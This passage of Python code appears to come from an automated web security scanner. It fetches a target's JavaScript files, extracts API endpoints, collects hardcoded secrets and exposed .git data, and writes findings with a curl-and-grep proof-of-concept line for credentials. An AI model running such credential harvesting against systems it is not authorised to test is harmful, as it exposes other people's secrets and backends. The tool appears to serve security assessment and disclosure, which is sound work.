          r = session.get(js_url, timeout=10)
          if r.status_code != 200:
              continue
          content = r.text

          # Find API endpoints in JS
          for m in API_EP_RE.finditer(content):
              ep = m.group(1)
              if len(ep) > 3 and not ep.startswith('//'):
                  _js_endpoints_found.add(ep)

          # Find secrets
          hits = find_secrets(content)
          # Filter known safe patterns (CDN keys, analytics)
          hits = [(l, v) for l, v in hits if not any(
              skip in v.lower() for skip in ['bugsnag', 'analytics', 'ga-', 'gtm-', 'hotjar']
          )]

          if hits:
              ef = save_evidence(f'js_secrets_{os.path.basename(js_url)[:40]}', js_url, r,
                                 extra=f'Secrets: {[(l,v[:60]) for l,v in hits[:5]]}')
              print(f'  [HIGH] Secrets in JS: {js_url}')
              for label, val in hits[:5]:
                  print(f'    [{label}] {val[:100]}')
                  _js_secrets_found.append({'file': js_url, 'label': label, 'value': val})
              _phase_findings.append({
                  'severity': 'HIGH',
                  'title': 'Secret in JS File',
                  'url': js_url, 'method': 'GET', 'screenshot': '',
                  'evidence': f'Secrets found: {[(l,v[:80]) for l,v in hits[:3]]}',
                  'impact': 'Hardcoded credentials/API keys in client-side JavaScript expose backend systems',
                  'poc': f'curl -s {js_url} | grep -Ei "password|api_key|secret|token"',
                  'evidence_file': ef,
              })
      except Exception:
          continue
      time.sleep(0.2)

  if _js_endpoints_found:
      print(f'  [INFO] {len(_js_endpoints_found)} API endpoints extracted from JS:')
      for ep in list(_js_endpoints_found)[:20]:
          print(f'    {ep}')
      _G['JS_API_ENDPOINTS'] = list(_js_endpoints_found)

  # ══════════════════════════════════════════════════════════════
  # FINAL — Save Evidence Index & Update _G
  # ══════════════════════════════════════════════════════════════
  index = {
      'target': BASE,
      'total_findings': len(_phase_findings),
      'git_exposed': _git_found,
      'git_secrets': len(_G.get('GIT_SECRETS', [])),
      'js_secrets': len(_js_secrets_found),
      'js_endpoints': len(_js_endpoints_found),
      'findings': [{k: v for k, v in f.items() if k != 'r'} for f in _phase_findings],
  }
  with open(os.path.join(EVIDENCE_DIR, '00_index.json'), 'w') as f:
      json.dump(index, f, indent=2)

  _G.setdefault('FINDINGS', []).extend(_phase_findings)

  print(f'\n{"="*60}')
  print(f'PHASE 21 COMPLETE')
  print(f'  Findings this phase:  {len(_phase_findings)}')
  print(f'  .git exposed:         {_git_found}')
  print(f'  Git secrets found:    {len(_G.get("GIT_SECRETS", []))}')
  print(f'  JS secrets found:     {len(_js_secrets_found)}')
  print(f'  JS endpoints found:   {len(_js_endpoints_found)}')
  print(f'  Evidence directory:   {EVIDENCE_DIR}')
  print(f'  Total findings now:   {len(_G["FINDINGS"])}')
  if _git_found:
      print(f'  Disclosure report:    {SESSION_DIR}/git_disclosure_report.md')
      print(f'  Secrets JSON:         {SESSION_DIR}/git_secrets.json')
  ```
